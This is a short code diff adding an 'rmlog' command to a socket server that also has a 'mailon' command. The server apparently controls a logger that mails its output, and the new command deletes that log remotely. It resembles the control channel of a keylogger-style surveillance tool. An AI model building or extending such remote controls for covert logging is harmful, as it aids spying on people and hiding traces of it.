@@ -45,6 +45,9 @@ class Server:
         elif cmd == 'mailon':
             self.mail_on()
             print('[+] Mail turned on')
+        elif cmd == 'rmlog':
+        	self.parent.logger.del_log()
+        	print('[+] Log deleted')
         self.conn.close()
         self.s.close()
         self.start()
